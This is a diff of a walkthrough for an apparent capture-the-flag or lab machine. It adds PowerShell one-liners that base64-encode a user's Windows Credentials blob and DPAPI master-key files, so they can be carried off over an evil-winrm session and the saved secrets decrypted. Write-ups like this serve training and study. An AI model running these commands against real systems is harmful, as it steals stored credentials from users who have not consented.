@@ -150,17 +150,17 @@
 
 23. Evil-winrm doesn't allow us to just download the file for some reason, so we encode the file contents with base64 and transfer it over to our local machine.
 
-``
+`[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"))`
 
 <img width="912" height="134" alt="image" src="https://github.com/user-attachments/assets/ae94b9d0-f2ab-4737-aa80-553da7280f02" />
 
 24. We do the same for the DPAPI keys
 
-``
+`[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))`
 
 <img width="914" height="202" alt="image" src="https://github.com/user-attachments/assets/3bd5eda6-ea55-42cf-b7e0-c495bebc4a81" />
 
-``
+`[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))`
 
 <img width="913" height="206" alt="image" src="https://github.com/user-attachments/assets/113b47d8-7566-4989-ab20-a7c210e35fee" />
 
